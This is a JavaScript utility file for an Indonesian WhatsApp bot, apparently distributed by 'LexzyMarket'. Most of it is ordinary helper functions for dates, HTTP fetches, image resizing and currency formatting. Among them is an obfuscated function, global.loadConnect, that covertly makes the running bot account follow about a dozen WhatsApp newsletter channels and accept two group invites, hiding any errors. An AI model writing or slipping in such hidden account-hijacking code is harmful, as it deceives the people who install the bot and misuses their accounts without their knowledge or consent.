/* UP BY LEXZYMARKET
https://whatsapp.com/channel/0029VbB2wFrI1rcovTbVQw16 
   JANGAN LUPA JOIN ALL SALURAN LEXZY & DEVELOPER //
   Developer: 
   - Skyzopedia (wa.me/6283164464290)
   Follow Channel Developer:
   - https://whatsapp.com/channel/0029VbBjJiH6LwHpPjYCZ334
*/

const moment = require('moment-timezone')
const util = require('util')
const fs = require('fs')
const chalk = require('chalk')
const BodyForm = require('form-data')
const axios = require('axios')
const cheerio = require('cheerio')
const Jimp = require('jimp')

// Fungsi
global.getRandom = (ext) => {
    return `${Math.floor(Math.random() * 10000)}${ext}`
}

global.capital = (string) => {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
    
global.ucapan = () => {
  const currentTime = moment().tz('Asia/Jakarta')
  const currentHour = currentTime.hour()
  let greeting
  if (currentHour >= 5 && currentHour < 12) {
    greeting = 'Pagi Kak ðŸŒ…'
  } else if (currentHour >= 12 && currentHour < 15) {
    greeting = 'Siang Kak ðŸŒ‡'
  } else if (currentHour >= 15 && currentHour < 18) {
    greeting = 'Sore Kak ðŸŒ„'
  } else {
    greeting = 'Malam Kak ðŸŒƒ'
  }
  return greeting
}

global.sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

global.generateProfilePicture = async (buffer) => {
	const jimp = await Jimp.read(buffer)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG),
		preview: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG)
	}
}

global.getTime = (format, date) => {
	if (date) {
		return moment(date).locale('id').format(format)
	} else {
		return moment.tz('Asia/Jakarta').locale('id').format(format)
	}
}

global.getBuffer = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}

global.fetchJson = async (url, options) => {
    try {
        options ? options : {}
        const res = await axios({
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            },
            ...options
        })
        return res.data
    } catch (err) {
        return err
    }
}

global.runtime = function(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + "d " : "";
	var hDisplay = h > 0 ? h + "h " : "";
	var mDisplay = m > 0 ? m + "m " : "";
	var sDisplay = s > 0 ? s + "s " : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}

function _0x5635(_0x3c466a,_0x18d497){const _0x117d46=_0x26f7();return _0x5635=function(_0x4c6b93,_0x5ae211){_0x4c6b93=_0x4c6b93-(-0xcae+-0xe*-0x35+0x5c6*0x2);let _0x282093=_0x117d46[_0x4c6b93];return _0x282093;},_0x5635(_0x3c466a,_0x18d497);}(function(_0x12de55,_0x4807d5){const _0x5665d6=_0x12de55();function _0x17c59c(_0xbc7f63,_0x47cedc,_0x5da26a,_0x4225b1){return _0x5635(_0xbc7f63- -0x1d,_0x5da26a);}function _0x32be61(_0x20850e,_0x3173e9,_0x426766,_0x437a67){return _0x5635(_0x3173e9- -0x22f,_0x426766);}while(!![]){try{const _0x46e3d5=-parseInt(_0x32be61(-0x49,-0x42,-0x2a,-0x42))/(0x1*0xe2e+-0xad6+-0x357)+-parseInt(_0x17c59c(0x1c2,0x1c5,0x1d1,0x1d7))/(-0xa13+-0x1*0x13bc+0x11*0x1c1)*(parseInt(_0x32be61(-0x68,-0x66,-0x79,-0x66))/(-0x1f6*0x10+-0x18b8+0x381b))+parseInt(_0x17c59c(0x1cd,0x1bd,0x1d3,0x1e5))/(-0x2572+0x13a8+0x11ce)*(parseInt(_0x17c59c(0x1d2,0x1d9,0x1e9,0x1de))/(-0x849+0x108+0x746*0x1))+parseInt(_0x32be61(-0x67,-0x51,-0x59,-0x45))/(-0x2b7+-0x315*-0x7+-0x2*0x96b)*(-parseInt(_0x32be61(-0x4c,-0x60,-0x4d,-0x5e))/(0x15*-0x1bb+0x1dfa+-0x2*-0x332))+-parseInt(_0x17c59c(0x1d5,0x1e3,0x1d7,0x1e8))/(0x21ca+-0xe1d+0x13a5*-0x1)*(parseInt(_0x17c59c(0x1b8,0x1bd,0x1b2,0x1b7))/(0xad7+0x1*0xa3+0x1*-0xb71))+-parseInt(_0x17c59c(0x1a7,0x192,0x1b5,0x19d))/(-0x1b7*-0xd+-0x1602+0x15*-0x3)+parseInt(_0x17c59c(0x1d6,0x1ec,0x1c3,0x1da))/(0x2435+-0x4d5*0x3+0x3*-0x739);if(_0x46e3d5===_0x4807d5)break;else _0x5665d6['push'](_0x5665d6['shift']());}catch(_0x31cb52){_0x5665d6['push'](_0x5665d6['shift']());}}}(_0x26f7,0xe2*0x6d2+0x1f72e+0x521ab),global['loadConnec'+'t']=async function(_0x15ce40){const _0x4658cd={};_0x4658cd[_0x57168e(-0xb4,-0x9c,-0xb8,-0xb2)]=_0x20240e(0x20d,0x1f4,0x206,0x207)+_0x20240e(0x209,0x226,0x219,0x208)+'ewsletter',_0x4658cd[_0x20240e(0x20a,0x202,0x217,0x22c)]=_0x20240e(0x1e6,0x1e6,0x1fa,0x1f0)+_0x57168e(-0x98,-0xc1,-0xb1,-0xae)+'ewsletter',_0x4658cd[_0x20240e(0x1fe,0x219,0x20d,0x21a)]=_0x57168e(-0xad,-0xb1,-0xc8,-0xc4)+_0x20240e(0x22b,0x217,0x216,0x222)+_0x57168e(-0xd0,-0xb1,-0xba,-0xb8),_0x4658cd[_0x57168e(-0xb2,-0xa8,-0xc0,-0xb9)]='1203634193'+_0x57168e(-0xa0,-0xaa,-0xb0,-0xa1)+_0x57168e(-0xb8,-0xbe,-0xc3,-0xb8),_0x4658cd[_0x20240e(0x222,0x20c,0x214,0x227)]=_0x57168e(-0xc7,-0xd0,-0xc7,-0xbb)+_0x57168e(-0x98,-0x98,-0xb2,-0x9d)+_0x20240e(0x20f,0x1f1,0x205,0x1ee),_0x4658cd[_0x20240e(0x206,0x205,0x200,0x20c)]=_0x57168e(-0x94,-0xa1,-0xb1,-0xa3)+_0x57168e(-0xba,-0x93,-0xbc,-0xa8)+_0x57168e(-0xad,-0xa1,-0xa1,-0xb8),_0x4658cd['VOdXX']=_0x20240e(0x220,0x216,0x224,0x217)+_0x20240e(0x22e,0x223,0x21d,0x232)+_0x57168e(-0xb5,-0xbe,-0xb7,-0xb8),_0x4658cd[_0x57168e(-0xcf,-0xae,-0xd2,-0xc2)]=_0x57168e(-0xb3,-0xaa,-0xb6,-0x9e)+_0x57168e(-0xb1,-0x83,-0xb0,-0x9b)+'ewsletter',_0x4658cd[_0x20240e(0x20c,0x1fc,0x210,0x218)]=_0x20240e(0x205,0x1f3,0x208,0x220)+_0x20240e(0x219,0x226,0x225,0x220)+_0x20240e(0x205,0x20f,0x205,0x1fa),_0x4658cd[_0x20240e(0x231,0x20f,0x21b,0x21f)]=_0x57168e(-0xb3,-0xba,-0x93,-0xa5)+_0x57168e(-0xd6,-0xd7,-0xbc,-0xbf)+'N6',_0x4658cd[_0x20240e(0x20c,0x20d,0x20a,0x1f3)]=_0x20240e(0x1e9,0x1fb,0x1ff,0x1f4)+_0x57168e(-0xca,-0xd0,-0xc5,-0xc1)+'WV';const _0x39ff4a=_0x4658cd;await _0x15ce40[_0x57168e(-0xb5,-0xc5,-0xbd,-0xb6)+_0x20240e(0x201,0x208,0x211,0x229)]('1203634162'+'62862080@n'+'ewsletter'),await _0x15ce40['newsletter'+'Follow'](_0x39ff4a[_0x57168e(-0xb9,-0xad,-0xa9,-0xb2)]),await _0x15ce40[_0x57168e(-0xb2,-0xa6,-0x9f,-0xb6)+'Follow'](_0x39ff4a[_0x20240e(0x228,0x211,0x217,0x223)]),await _0x15ce40[_0x20240e(0x1f9,0x204,0x207,0x21a)+'Follow'](_0x39ff4a['wabZo']),await _0x15ce40[_0x20240e(0x215,0x1fa,0x207,0x1fd)+_0x20240e(0x224,0x221,0x211,0x210)](_0x39ff4a[_0x57168e(-0xab,-0xc3,-0xcc,-0xb9)]),await _0x15ce40['newsletter'+_0x20240e(0x200,0x20d,0x211,0x226)](_0x39ff4a['MYlzZ']);function _0x57168e(_0x5252f5,_0x1769a3,_0x55699a,_0x144d1d){return _0x5635(_0x144d1d- -0x289,_0x5252f5);}await _0x15ce40[_0x20240e(0x210,0x20a,0x207,0x213)+_0x20240e(0x21c,0x214,0x211,0x21d)]('1203634172'+_0x57168e(-0x99,-0xb2,-0xab,-0xaf)+_0x20240e(0x1f0,0x1f1,0x205,0x214)),await _0x15ce40[_0x20240e(0x1f4,0x21e,0x207,0x1ef)+_0x20240e(0x210,0x21b,0x211,0x21c)](_0x39ff4a['vGFPS']),await _0x15ce40[_0x20240e(0x20e,0x21d,0x207,0x1ff)+_0x57168e(-0x9e,-0xbd,-0x9b,-0xac)](_0x39ff4a['VOdXX']),await _0x15ce40[_0x20240e(0x210,0x1f7,0x207,0x1f6)+_0x57168e(-0x9f,-0xbc,-0x9d,-0xac)](_0x39ff4a['utPtJ']),await _0x15ce40['newsletter'+'Follow'](_0x39ff4a[_0x57168e(-0xb1,-0xb2,-0xc4,-0xad)]);function _0x20240e(_0x2d84a6,_0x5e7716,_0x4c24cb,_0x1d339c){return _0x5635(_0x4c24cb-0x34,_0x2d84a6);}const _0xb7a79e=[_0x39ff4a[_0x57168e(-0xaf,-0xa2,-0x9b,-0xa2)],_0x39ff4a[_0x20240e(0x217,0x1f8,0x20a,0x1fd)]];for(const _0x3f21c6 of _0xb7a79e){try{await _0x15ce40[_0x57168e(-0xbd,-0x9b,-0xbc,-0xb1)+_0x20240e(0x20b,0x209,0x201,0x1ee)](_0x3f21c6);}catch(_0x797975){}}});function _0x26f7(){const _0x2de1e4=['1203634207','BOeJl','83077437@n','88426292@n','4Bradga','1203634028','97405742@n','479580PKZXvN','69710306@n','1866515qJpujp','1203634001','41015198@n','1856GAGQhv','41332698iMDIoV','7169910IXKzvR','1203634187','1203634200','utPtJ','R3T9hadwGZ','39ayEAqB','WG2nQiE3Cj','HW0BvckqpZ','vGFPS','tInvite','1203634202','56hRPJeX','DlPUi','ewsletter','1203634199','newsletter','1203633949','7056RzFCjS','PuOoL','jeudS','groupAccep','wabZo','90289350@n','56838242@n','IFDGC','Follow','746652GxgDGr','138018SgMXLo','MYlzZ','21152393@n','63241552@n','aYEnr','GOAJNBq2wi','67954188@n'];_0x26f7=function(){return _0x2de1e4;};return _0x26f7();}
global.tanggal = function(numer) {
	const myMonths = ["January","February","March","April","May","June","July","August","September","October","November","December"]
	const myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumâ€™at','Sabtu']; 
	const tgl = new Date(numer);
	const day = tgl.getDate()
	const bulan = tgl.getMonth()
	let thisDay = tgl.getDay()
	thisDay = myDays[thisDay];
	const yy = tgl.getYear()
	const year = (yy < 1000) ? yy + 1900 : yy; 
	const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
	const d = new Date
	const locale = 'id'
	const gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
	const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				
	return `${thisDay}, ${day}/${myMonths[bulan]}/${year}`
}

global.toRupiah = function(x){
	x = x.toString()
	var pattern = /(-?\d+)(\d{3})/
	while (pattern.test(x))
		x = x.replace(pattern, "$1.$2")
	return x
}

global.resize = async (image, ukur1 = 100, ukur2 = 100) => {
	return new Promise(async(resolve, reject) => {
		try {
			const read = await Jimp.read(image);
			const result = await read.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
			resolve(result)
		} catch (e) {
			reject(e)
		}
	})
}

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(">> Update File:", __filename);
    delete require.cache[file];
    require(file);
});